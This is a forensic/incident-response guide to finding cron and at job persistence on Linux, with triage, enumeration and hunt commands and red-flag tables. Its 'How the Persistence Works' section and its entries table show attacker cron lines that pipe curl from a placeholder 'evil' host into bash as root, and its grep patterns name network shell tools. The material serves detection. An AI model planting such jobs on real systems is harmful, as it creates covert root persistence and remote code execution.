# Cron and at Jobs

Cron is the oldest and most portable UNIX persistence mechanism, and attackers still reach for it constantly because it's simple, reliable, and spread across enough locations that a careless responder misses one. `at` is its one-shot cousin — a job that runs *once* at a set time and leaves no recurring entry to catch your eye. Detection comes down to enumerating **every** crontab location (per-user spool, system crontab, drop-in dirs, the cadence directories) as root, and checking the `at` queue even when cron looks clean.

> 🔴 The per-user cron spool (`/var/spool/cron/…`) is mode 700, root-owned — a **non-root** run reads nothing and can silently report "no cron jobs," a dangerous false negative. Run as root. And always check `atq`: `at` runs a job once and won't appear in any crontab, so a clean cron does not mean nothing is scheduled.

## Contents

- [Quick Triage](#quick-triage)
- [What to Check for What](#what-to-check-for-what)
- [How the Persistence Works](#how-the-persistence-works)
- [Where Cron Lives](#where-cron-lives)
- [Reading a Crontab Entry](#reading-a-crontab-entry)
- [Enumerating Cron](#enumerating-cron)
- [at Jobs](#at-jobs)
- [Execution Evidence](#execution-evidence)
- [Deep Threat Hunts](#deep-threat-hunts)
- [Getting Max Value](#getting-max-value)
- [Correlate With](#correlate-with)
- [Scenarios](#scenarios)
- [Red Flags](#red-flags)

## Quick Triage

```bash
# Every user's crontab (root needed for the spool)
for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u "$u" 2>/dev/null | sed "s/^/[$u] /"; done

# System crontab + drop-ins + cadence dirs
cat /etc/crontab; cat /etc/cron.d/* 2>/dev/null; ls -la /etc/cron.{hourly,daily,weekly,monthly}/

# at queue (runs once - easy to miss)
atq

# Payload-shaped cron lines anywhere
grep -rIE "curl|wget|base64|nc |bash -c|/tmp/|/dev/shm|@reboot" /etc/cron* /var/spool/cron 2>/dev/null
```

## What to Check for What

| Investigative question | Command / filter |
|------------------------|------------------|
| Any payload-shaped cron line? | `grep -riE 'curl\|/dev/tcp\|base64\|@reboot' /etc/cron* /var/spool/cron` |
| Service-account cron (shouldn't exist)? | `crontab -l -u www-data`/`nobody`/`postgres` |
| Root job masquerading in `cron.d`? | `cat /etc/cron.d/*` (user field = `root`) |
| Executable dropped in a cadence dir? | `find /etc/cron.daily … -type f -perm -111 -mtime -30` |
| PATH/command hijack via cron env? | `grep -E '^PATH=\|^SHELL=' /etc/cron.d/ /etc/crontab` |
| One-shot `at` job? | `atq`; `at -c <id>` |
| When was it planted? | cron file mtime (corroborate with cron log) |
| Did it actually run? | `grep CRON.*CMD /var/log/cron`; journal |
| Armored against removal? | `lsattr` (`+i`) |

## How the Persistence Works

The attacker adds a scheduled line that re-executes their payload — at boot (`@reboot`), at an interval (beaconing), or at a fixed time. The classic install:

```bash
# 1) Add a job to the current user's crontab (or -u <user> as root)
(crontab -l 2>/dev/null; echo "@reboot /tmp/.x") | crontab -

# 2) Or drop a system-wide job (runs as root, blends with system cron)
echo "* * * * * root curl -s http://evil/c | bash" > /etc/cron.d/apache-update
```

🔴 From then on the job fires on its schedule with the owning user's privileges — `@reboot` survives restarts, `*/5 * * * *` beacons every five minutes, and a file in `/etc/cron.d/` runs as **root** while looking like a legitimate system job.

## Where Cron Lives

The spread across locations is the whole reason cron is easy to miss — enumerate all of them.

| Path | Holds |
|------|-------|
| 🔴 `/var/spool/cron/crontabs/<user>` (Debian) | Per-user crontabs (700, root:crontab) |
| 🔴 `/var/spool/cron/<user>` (RHEL) | Per-user crontabs |
| 🔴 `/etc/crontabs/<user>` (Alpine, **BusyBox crond**) | Per-user crontabs on Alpine/containers |
| `/etc/periodic/{15min,hourly,daily,weekly,monthly}/` (Alpine) | BusyBox `run-parts` cadence dirs |
| `/etc/crontab` | System crontab (has a **user** field) |
| 🔴 `/etc/cron.d/` | Drop-in system cron files — a favored hiding spot |
| `/etc/cron.{hourly,daily,weekly,monthly}/` | Scripts run on those cadences |
| `/etc/cron.allow` / `/etc/cron.deny` | Who may use cron |
| `/var/spool/cron/atjobs/` (Debian) / `/var/spool/at/` (RHEL) | `at` job spool |
| `/var/log/cron` (RHEL) / syslog (Debian) | Cron **execution** log |

> The cron daemon is `cron`/`crond` (a systemd service); `atd` runs `at` jobs. Both need to be running for the jobs to fire — check `systemctl status cron atd`.

## Reading a Crontab Entry

```
┌ minute (0–59)
│ ┌ hour (0–23)
│ │ ┌ day-of-month (1–31)
│ │ │ ┌ month (1–12)
│ │ │ │ ┌ day-of-week (0–7, 0/7=Sun)
│ │ │ │ │
* * * * *  command args      (user crontab)
* * * * *  user command args (system crontab / cron.d - note the extra user field)
```

| Entry | Runs | Suspicion |
|-------|------|-----------|
| `*/5 * * * * /tmp/.x` | Every 5 minutes | 🔴 Beaconing from a temp path |
| `@reboot /home/u/.cache/svc` | Every boot | 🔴 Boot persistence |
| `0 * * * * curl -s http://evil | bash` | Hourly | 🔴 Hourly stager |
| `30 9 * * 1-5 /usr/local/bin/job` | Weekdays 09:30 | Looks legit — verify the binary |

Special strings: `@reboot`, `@daily`, `@hourly`, `@weekly`, `@monthly`.

## Enumerating Cron

```bash
# A specific user's crontab
crontab -l -u www-data

# All user crontab files (raw spool, root)
ls -la /var/spool/cron/crontabs/ /var/spool/cron/ 2>/dev/null

grep -rEv '^\s*#' /var/spool/cron/ 2>/dev/null

# System + drop-ins + cadence dirs
cat /etc/crontab; cat /etc/cron.d/*; ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly

# Hunt payloads across all cron
grep -riE 'curl|wget|base64|/tmp/|/dev/shm|python|bash -c|nc |/dev/tcp' /etc/cron* /var/spool/cron 2>/dev/null
```

🔴 Read closely: `@reboot` and short intervals; jobs invoking downloaders/interpreters; cron files with a recent mtime (freshly planted); and jobs owned by **service accounts** (`www-data`, `nobody`, `postgres`) that have no legitimate reason to schedule anything.

## at Jobs

```bash
# Queued at jobs
atq

# Inspect a specific job's full script
at -c <jobid>

# On-disk spool
ls -la /var/spool/cron/atjobs/ 2>/dev/null    # Debian

ls -la /var/spool/at/ 2>/dev/null             # RHEL
```

🔴 `at` schedules a **one-shot** execution — an attacker can queue their payload to run after they log off or at a quiet hour, with nothing recurring to notice. Always dump the queue.

## Execution Evidence

Proof the job actually ran ties the persistence to activity in your timeline.

```bash
# Cron execution (Debian folds into syslog; RHEL uses /var/log/cron)
grep -i CRON /var/log/syslog 2>/dev/null; cat /var/log/cron 2>/dev/null

# Timer/cron/atd starts in the journal
journalctl _COMM=cron _COMM=crond _COMM=atd 2>/dev/null | tail

# Cron job output is mailed locally unless MAILTO redirects it
ls -la /var/mail/ /var/spool/mail/ 2>/dev/null
```

## Deep Threat Hunts

*(seasoned-DFIR; detection focus — collection/timeline is in Scheduled Tasks, note 08)*

```bash
# 1. Payload-shaped cron across EVERY location
grep -riE 'curl|wget|base64|/dev/tcp|nc |bash -c|python -c|/tmp/|/dev/shm|@reboot' \
  /etc/crontab /etc/cron.d /etc/cron.{hourly,daily,weekly,monthly} /var/spool/cron 2>/dev/null

# 2. Executable dropped in a run-parts cadence dir (fires regardless of name)
find /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly -type f -perm -111 -mtime -30 -ls 2>/dev/null

# 3. PATH / SHELL override in a cron.d file (hijacks whichever command the job runs)
grep -rEn '^PATH=|^SHELL=|^MAILTO=' /etc/cron.d/ /etc/crontab 2>/dev/null

# 4. Service-account crontabs (should be empty)
for u in www-data nobody postgres apache nginx mysql daemon; do
  out=$(crontab -l -u "$u" 2>/dev/null) && [ -n "$out" ] && echo "== $u ==" && echo "$out"
done

# 5. at queue + each job's full script
atq; for j in $(atq 2>/dev/null | awk '{print $1}'); do echo "== at job $j =="; at -c "$j"; done

# 6. Immutable cron files (armored persistence)
lsattr /etc/cron.d/* /etc/crontab /var/spool/cron/* 2>/dev/null | grep -E '^....i'

# 7. Decode a base64 payload spotted in a cron line
echo '<base64blob>' | base64 -d

# 8. Proof it ran (tie to the process tree via auditd/journal)
grep -iE 'CRON.*CMD' /var/log/cron /var/log/syslog 2>/dev/null
```

**Hunt ideas:**

- **Grep for payload shapes AND `PATH=`/`SHELL=` overrides** — a prepended `PATH` in a `cron.d` file hijacks whichever command the job invokes, even a "clean-looking" one.
- **run-parts dirs (`cron.daily` etc.) execute any executable file regardless of name** — a recently-added executable there runs on schedule; that combination is high-signal.
- **Service accounts almost never legitimately cron** — an entry for `www-data`/`nobody` is a strong lead.
- **Decode base64/hex in cron lines** to reveal the real command before judging it.
- **Tie the `CRON … CMD` log line to the process tree it spawned** (auditd/journal) to see what the job actually did.

## Getting Max Value

- **Run as root, enumerate every user** — the spool is 700, and a non-root sweep reports a false "no cron."
- **File mtime dates the plant** — but `crontab -e` rewrites the spool file's mtime, so corroborate with the cron execution log.
- **Decode obfuscated payloads** (`base64 -d`, `xxd -r`) before deciding.
- **If a crontab was removed** (`crontab -r`), the spool file may be recoverable via deleted-file recovery.
- **Hand off to Scheduled Tasks (08)** for the full artifact collection/timeline.

## Correlate With

| To answer… | Pivot to |
|------------|----------|
| Collect + timeline the cron artifacts | **Scheduled Tasks Spool and State** (08) |
| What the job executed + its lineage | **Auditd**, **Systemd Journal**, **Process Trees** (10b) |
| The systemd-timer equivalent | **Systemd Units Timers and Generators** |
| Whether the cron file is timestomped/immutable | **File and Directory Permissions** (02) |
| How to remove it safely | **Remediation and Containment** (14) |

## Scenarios

- **Boot persistence:** an `@reboot` job re-launches the payload on every restart.
- **Root masquerade:** a `/etc/cron.d/` file runs as root while looking like a legitimate update job.
- **Service-account beacon:** `www-data`'s crontab has a `*/5` job fetching from C2.
- **One-shot delay:** an `at` job fires once after the attacker logs off — cron looks clean.
- **PATH hijack:** a `cron.d` file prepends a writable dir to `PATH`, so a "normal" command runs the attacker's binary.

## Red Flags

| 🔴 Finding | Likely meaning |
|-----------|----------------|
| `@reboot` / short-interval job running a network fetch | Boot persistence + C2/download |
| Job in `/etc/cron.d/` running as root with an odd payload | System-level persistence masquerading as a legit job |
| Cron/at job owned by a service account | Repurposed for attacker execution |
| Recently modified cron file (mtime in incident window) | Freshly planted |
| `at` job queued (runs once) | Delayed / one-shot execution, easily missed |
| Cron file with `+i` immutable bit | Armored persistence |
| Payload path in `/tmp`/`/dev/shm`/hidden dir | Staged malware |
| Executable added to `cron.daily`/etc. | run-parts fires it on schedule |
| `PATH=`/`SHELL=` override in a `cron.d` file | Command hijack |

## Resources

- `crontab(5)`, `cron(8)`, `at(1)`, `run-parts(8)` man pages
- MITRE ATT&CK: T1053.003 (Scheduled Task/Job: Cron), T1053.002 (At)
